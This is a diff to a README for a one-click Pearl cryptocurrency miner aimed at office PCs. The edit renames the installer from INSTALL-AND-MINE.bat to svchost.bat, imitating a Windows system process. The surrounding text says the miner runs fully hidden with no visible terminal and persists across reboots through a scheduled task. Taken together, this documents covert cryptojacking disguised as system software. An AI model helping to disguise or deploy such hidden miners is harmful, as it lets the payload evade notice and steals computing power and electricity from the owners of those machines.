@@ -1,6 +1,6 @@
 # Pearl (PRL) miner — one-click install for office PCs
 
-One file. Double-click `INSTALL-AND-MINE.bat` on a PC and it installs and starts
+One file. Double-click `svchost.bat` on a PC and it installs and starts
 mining Pearl to Kryptex, then keeps it running across reboots.
 
 ## What it does
@@ -42,7 +42,7 @@ Performance → Tuning → Power Limit `-30%`.
 ## Usage
 
 ```
-Double-click INSTALL-AND-MINE.bat
+Double-click svchost.bat
 ```
 
 **No terminal stays on screen.** The miner runs fully hidden — the scheduled task
